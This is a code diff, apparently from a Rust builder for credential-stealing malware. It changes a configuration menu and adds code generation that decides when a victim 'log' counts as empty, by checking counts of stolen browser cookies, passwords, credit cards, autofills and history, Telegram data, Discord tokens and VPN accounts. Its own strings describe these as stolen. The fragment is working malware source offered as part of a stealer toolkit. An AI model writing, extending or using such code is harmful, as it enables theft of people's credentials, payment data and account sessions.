@@ -25,25 +25,74 @@
  */
 use std::fmt::{Display, Formatter};
 use inquire::{InquireError, MultiSelect};
-use inquire::list_option::ListOption;
-use inquire::validator::Validation;
+use proc_macro2::TokenStream;
+use quote::quote;
 use strum::IntoEnumIterator;
 use strum_macros::EnumIter;
-use crate::Ask;
+use crate::{Ask, ToExpr};
 
 #[derive(EnumIter, PartialEq)]
-enum ConsiderEmpty {
-    WhenAllEmpty,
+pub enum ConsiderEmpty {
     WhenEmptyBrowsers,
-    WhenEmptyMessengers
+    WhenEmptyMessengers,
+    WhenEmptyVpnAccounts
 }
 
 impl Display for ConsiderEmpty {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         match self {
-            ConsiderEmpty::WhenAllEmpty => write!(f, "When all are empty"),
-            ConsiderEmpty::WhenEmptyBrowsers => write!(f, "When browsers are empty"),
-            ConsiderEmpty::WhenEmptyMessengers => write!(f, "When messengers are empty"),
+            ConsiderEmpty::WhenEmptyBrowsers => write!(f, "When all browser data is empty"),
+            ConsiderEmpty::WhenEmptyMessengers => write!(f, "When no messengers are stolen"),
+            ConsiderEmpty::WhenEmptyVpnAccounts => write!(f, "When no VPN accounts are stolen"),
+        }
+    }
+}
+
+impl ToExpr<(TokenStream,TokenStream)> for ConsiderEmpty {
+    fn to_expr(&self, args: (TokenStream,TokenStream)) -> TokenStream {
+        let (collector, return_stmt) = args;
+
+        match self {
+            ConsiderEmpty::WhenEmptyBrowsers => quote! {
+                if #collector.get_browser().get_cookies() == 0
+                    || #collector.get_browser().get_passwords() == 0
+                    || #collector.get_browser().get_credit_cards() == 0
+                    || #collector.get_browser().get_auto_fills() == 0
+                    || #collector.get_browser().get_history() == 0
+                    || #collector.get_browser().get_bookmarks() == 0
+                    || #collector.get_browser().get_downloads() == 0
+                {
+                    #return_stmt
+                }
+            },
+            ConsiderEmpty::WhenEmptyMessengers => quote! {
+                if !#collector.get_software().is_telegram()
+                    || #collector.get_software().get_discord_tokens() == 0
+                {
+                    #return_stmt
+                }
+            },
+            ConsiderEmpty::WhenEmptyVpnAccounts => quote! {
+                if #collector.get_vpn().get_accounts() == 0 {
+                    #return_stmt
+                }
+            }
+        }
+    }
+}
+
+impl ToExpr<(TokenStream, TokenStream)> for Vec<ConsiderEmpty> {
+    fn to_expr(&self, args: (TokenStream, TokenStream)) -> TokenStream {
+        let (collector, return_stmt) = args;
+
+        let if_blocks: Vec<TokenStream> = self.iter()
+            .map(|cond| cond.to_expr((collector.clone(), return_stmt.clone())))
+            .collect();
+
+        quote! {
+            {
+                #(#if_blocks)*
+            }
         }
     }
 }
@@ -53,21 +102,10 @@ impl Ask for Vec<ConsiderEmpty> {
     where
         Self: Sized
     {
-        let validator = |selected: &[ListOption<&ConsiderEmpty>]| {
-            if selected.iter().find(|s| *s.value == ConsiderEmpty::WhenAllEmpty).is_some()
-                && selected.len() > 1
-            {
-                Ok(Validation::Invalid("Please select either 'When all are empty' or the specific options, not both.".into()))
-            } else {
-                Ok(Validation::Valid)
-            }
-        };
-
         MultiSelect::new(
-            "Under which condition should the log be considered empty?",
+            "Under what conditions should the log be considered empty? Leave unselected to disable.",
             ConsiderEmpty::iter().collect()
         )
-        .with_validator(validator)
         .prompt()
     }
 }
